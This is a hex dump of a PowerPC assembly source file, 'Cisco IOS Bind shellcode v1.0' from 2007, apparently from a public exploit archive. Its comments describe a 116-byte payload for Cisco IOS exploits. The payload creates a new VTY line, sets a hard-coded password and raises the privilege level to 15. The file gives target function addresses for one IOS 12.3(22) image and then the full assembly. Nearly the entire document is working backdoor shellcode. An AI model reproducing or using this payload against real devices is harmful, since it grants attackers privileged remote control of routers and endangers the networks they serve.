00000000  23 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |# --------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000050  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 0d 0a 23 0d 0a 23  |----------..#..#|
00000060  20 43 69 73 63 6f 20 49  4f 53 20 42 69 6e 64 20  | Cisco IOS Bind |
00000070  73 68 65 6c 6c 63 6f 64  65 20 76 31 2e 30 0d 0a  |shellcode v1.0..|
00000080  23 20 28 63 29 20 32 30  30 37 20 49 52 4d 20 50  |# (c) 2007 IRM P|
00000090  6c 63 0d 0a 23 20 42 79  20 56 61 72 75 6e 20 55  |lc..# By Varun U|
000000a0  70 70 61 6c 0d 0a 23 0d  0a 23 20 2d 2d 2d 2d 2d  |ppal..#..# -----|
000000b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000100  2d 2d 2d 0d 0a 23 0d 0a  23 20 54 68 65 20 63 6f  |---..#..# The co|
00000110  64 65 20 63 72 65 61 74  65 73 20 61 20 6e 65 77  |de creates a new|
00000120  20 56 54 59 2c 20 61 6c  6c 6f 63 61 74 65 73 20  | VTY, allocates |
00000130  61 20 70 61 73 73 77 6f  72 64 20 74 68 65 6e 20  |a password then |
00000140  73 65 74 73 20 74 68 65  20 70 72 69 76 69 6c 65  |sets the privile|
00000150  67 65 20 6c 65 76 65 6c  20 74 6f 20 31 35 0d 0a  |ge level to 15..|
00000160  23 0d 0a 23 20 54 68 69  73 20 73 68 65 6c 6c 63  |#..# This shellc|
00000170  6f 64 65 20 63 61 6e 20  62 65 20 75 73 65 64 20  |ode can be used |
00000180  61 73 20 74 68 65 20 70  61 79 6c 6f 61 64 20 66  |as the payload f|
00000190  6f 72 20 61 6e 79 20 49  4f 53 20 65 78 70 6c 6f  |or any IOS explo|
000001a0  69 74 20 6f 6e 20 61 20  50 6f 77 65 72 50 43 2d  |it on a PowerPC-|
000001b0  62 61 73 65 64 20 64 65  76 69 63 65 2e 0d 0a 23  |based device...#|
000001c0  20 4f 6e 63 65 20 61 73  73 65 6d 62 6c 65 64 2c  | Once assembled,|
000001d0  20 74 68 65 20 70 61 79  6c 6f 61 64 20 69 73 20  | the payload is |
000001e0  6f 6e 6c 79 20 31 31 36  20 62 79 74 65 73 20 69  |only 116 bytes i|
000001f0  6e 20 6c 65 6e 67 74 68  20 0d 0a 23 0d 0a 23 20  |n length ..#..# |
00000200  54 68 65 20 66 6f 6c 6c  6f 77 69 6e 67 20 66 6f  |The following fo|
00000210  75 72 20 68 61 72 64 2d  63 6f 64 65 64 20 61 64  |ur hard-coded ad|
00000220  64 72 65 73 73 65 73 20  6d 75 73 74 20 62 65 20  |dresses must be |
00000230  6c 6f 63 61 74 65 64 20  66 6f 72 20 74 68 65 20  |located for the |
00000240  74 61 72 67 65 74 20 49  4f 53 20 76 65 72 73 69  |target IOS versi|
00000250  6f 6e 2e 20 0d 0a 23 20  56 65 72 73 69 6f 6e 20  |on. ..# Version |
00000260  31 2e 31 20 6f 66 20 74  68 65 20 73 68 65 6c 6c  |1.1 of the shell|
00000270  63 6f 64 65 20 77 69 6c  6c 20 61 75 74 6f 2d 6c  |code will auto-l|
00000280  6f 63 61 74 65 20 74 68  65 73 65 20 76 61 6c 75  |ocate these valu|
00000290  65 73 20 61 6e 64 20 6d  61 6b 65 20 74 68 65 20  |es and make the |
000002a0  63 6f 64 65 20 0d 0a 23  20 49 4f 53 2d 76 65 72  |code ..# IOS-ver|
000002b0  73 69 6f 6e 2d 69 6e 64  65 70 65 6e 64 65 6e 74  |sion-independent|
000002c0  0d 0a 23 0d 0a 23 20 54  68 65 20 68 61 72 64 2d  |..#..# The hard-|
000002d0  63 6f 64 65 64 20 61 64  64 72 65 73 73 65 73 20  |coded addresses |
000002e0  75 73 65 64 20 68 65 72  65 20 61 72 65 20 66 6f  |used here are fo|
000002f0  72 3a 0d 0a 23 0d 0a 23  20 49 4f 53 20 28 74 6d  |r:..#..# IOS (tm|
00000300  29 20 43 32 36 30 30 20  53 6f 66 74 77 61 72 65  |) C2600 Software|
00000310  20 28 43 32 36 30 30 2d  49 4b 39 53 2d 4d 29 2c  | (C2600-IK9S-M),|
00000320  20 56 65 72 73 69 6f 6e  20 31 32 2e 33 28 32 32  | Version 12.3(22|
00000330  29 2c 20 52 45 4c 45 41  53 45 20 53 4f 46 54 57  |), RELEASE SOFTW|
00000340  41 52 45 20 28 66 63 32  29 0d 0a 23 0d 0a 23 20  |ARE (fc2)..#..# |
00000350  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003a0  2d 2d 2d 2d 2d 2d 2d 2d  0d 0a 2e 65 71 75 20 6d  |--------...equ m|
000003b0  61 6b 65 6e 65 77 76 74  79 2c 20 30 78 38 30 33  |akenewvty, 0x803|
000003c0  64 30 64 30 38 0d 0a 2e  65 71 75 20 6d 61 6c 6c  |d0d08...equ mall|
000003d0  6f 63 2c 20 30 78 38 30  34 37 38 35 63 63 0d 0a  |oc, 0x804785cc..|
000003e0  2e 65 71 75 20 73 65 74  70 77 6f 6e 6c 69 6e 65  |.equ setpwonline|
000003f0  2c 20 30 78 38 30 33 62  39 65 39 30 0d 0a 2e 65  |, 0x803b9e90...e|
00000400  71 75 20 6c 69 6e 65 73  73 74 72 75 63 74 2c 20  |qu linesstruct, |
00000410  30 78 38 32 66 39 65 33  33 34 0d 0a 23 20 2d 2d  |0x82f9e334..# --|
00000420  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000470  2d 2d 2d 2d 2d 2d 0d 0a  0d 0a 2e 65 71 75 20 70  |------.....equ p|
00000480  72 69 76 2c 20 30 78 66  31 30 30 30 30 30 30 09  |riv, 0xf1000000.|
00000490  09 23 76 61 6c 75 65 20  75 73 65 64 20 74 6f 20  |.#value used to |
000004a0  73 65 74 20 74 68 65 20  70 72 69 76 69 6c 65 67  |set the privileg|
000004b0  65 20 6c 65 76 65 6c 0d  0a 0d 0a 6d 61 69 6e 3a  |e level....main:|
000004c0  09 6c 69 20 33 2c 37 31  09 09 09 23 6e 65 77 20  |.li 3,71...#new |
000004d0  76 74 79 20 6c 69 6e 65  20 3d 20 37 31 0d 0a 09  |vty line = 71...|
000004e0  6c 69 73 20 39 2c 6d 61  6b 65 6e 65 77 76 74 79  |lis 9,makenewvty|
000004f0  40 68 61 0d 0a 09 6c 61  20 39 2c 6d 61 6b 65 6e  |@ha...la 9,maken|
00000500  65 77 76 74 79 40 6c 28  39 29 0d 0a 09 6d 74 63  |ewvty@l(9)...mtc|
00000510  74 72 20 39 0d 0a 09 62  63 74 72 6c 09 09 09 23  |tr 9...bctrl...#|
00000520  6d 61 6b 65 6e 65 77 76  74 79 28 29 0d 0a 0d 0a  |makenewvty()....|
00000530  09 6c 69 20 33 2c 30 78  31 65 35 63 0d 0a 09 6c  |.li 3,0x1e5c...l|
00000540  69 73 20 39 2c 6d 61 6c  6c 6f 63 40 68 61 0d 0a  |is 9,malloc@ha..|
00000550  09 6c 61 20 39 2c 6d 61  6c 6c 6f 63 40 6c 28 39  |.la 9,malloc@l(9|
00000560  29 0d 0a 09 6d 74 63 74  72 20 39 0d 0a 09 62 63  |)...mtctr 9...bc|
00000570  74 72 6c 09 09 09 23 6d  61 6c 6c 6f 63 28 29 20  |trl...#malloc() |
00000580  6d 65 6d 6f 72 79 20 66  6f 72 20 73 74 72 75 63  |memory for struc|
00000590  74 75 72 65 0d 0a 0d 0a  09 6c 69 20 34 2c 37 30  |ture.....li 4,70|
000005a0  09 09 0d 0a 09 73 74 77  20 34 2c 30 78 61 36 38  |.....stw 4,0xa68|
000005b0  28 33 29 0d 0a 09 6c 69  20 35 2c 37 32 09 09 0d  |(3)...li 5,72...|
000005c0  0a 09 73 74 77 20 35 2c  30 78 61 36 63 28 33 29  |..stw 5,0xa6c(3)|
000005d0  0d 0a 09 6c 69 20 34 2c  30 78 30 30 09 09 0d 0a  |...li 4,0x00....|
000005e0  09 62 6c 20 73 65 74 70  09 09 09 23 70 6f 69 6e  |.bl setp...#poin|
000005f0  74 65 72 20 74 6f 20 74  68 65 20 70 61 73 73 77  |ter to the passw|
00000600  6f 72 64 20 69 6e 74 6f  20 4c 52 0d 0a 0d 0a 2e  |ord into LR.....|
00000610  73 74 72 69 6e 67 20 22  31 72 6d 70 34 35 35 22  |string "1rmp455"|
00000620  09 09 23 74 68 65 20 70  61 73 73 77 6f 72 64 20  |..#the password |
00000630  66 6f 72 20 74 68 65 20  6c 69 6e 65 0d 0a 0d 0a  |for the line....|
00000640  73 65 74 70 3a 09 6d 66  6c 72 20 35 0d 0a 09 6c  |setp:.mflr 5...l|
00000650  69 73 20 39 2c 73 65 74  70 77 6f 6e 6c 69 6e 65  |is 9,setpwonline|
00000660  40 68 61 0d 0a 20 20 20  20 20 20 09 6c 61 20 39  |@ha..      .la 9|
00000670  2c 73 65 74 70 77 6f 6e  6c 69 6e 65 40 6c 28 39  |,setpwonline@l(9|
00000680  29 0d 0a 20 20 20 20 20  20 09 6d 74 63 74 72 20  |)..      .mtctr |
00000690  39 0d 0a 20 20 20 20 20  20 09 62 63 74 72 6c 09  |9..      .bctrl.|
000006a0  09 09 23 73 65 74 70 77  6f 6e 6c 69 6e 65 28 29  |..#setpwonline()|
000006b0  0d 0a 0d 0a 09 6c 69 73  20 38 2c 6c 69 6e 65 73  |.....lis 8,lines|
000006c0  73 74 72 75 63 74 40 68  61 0d 0a 20 20 20 20 20  |struct@ha..     |
000006d0  20 09 6c 61 20 38 2c 6c  69 6e 65 73 73 74 72 75  | .la 8,linesstru|
000006e0  63 74 40 6c 28 38 29 0d  0a 09 6c 77 7a 20 39 2c  |ct@l(8)...lwz 9,|
000006f0  30 28 38 29 0d 0a 09 6c  69 73 20 37 2c 70 72 69  |0(8)...lis 7,pri|
00000700  76 40 68 61 0d 0a 20 20  20 20 20 09 6c 61 20 37  |v@ha..     .la 7|
00000710  2c 70 72 69 76 40 6c 28  37 29 0d 0a 09 73 74 77  |,priv@l(7)...stw|
00000720  20 37 2c 30 78 64 65 34  28 39 29 09 09 23 73 65  | 7,0xde4(9)..#se|
00000730  74 20 70 72 69 76 69 6c  65 67 65 20 6c 65 76 65  |t privilege leve|
00000740  6c 20 74 6f 20 31 35                              |l to 15|
00000747
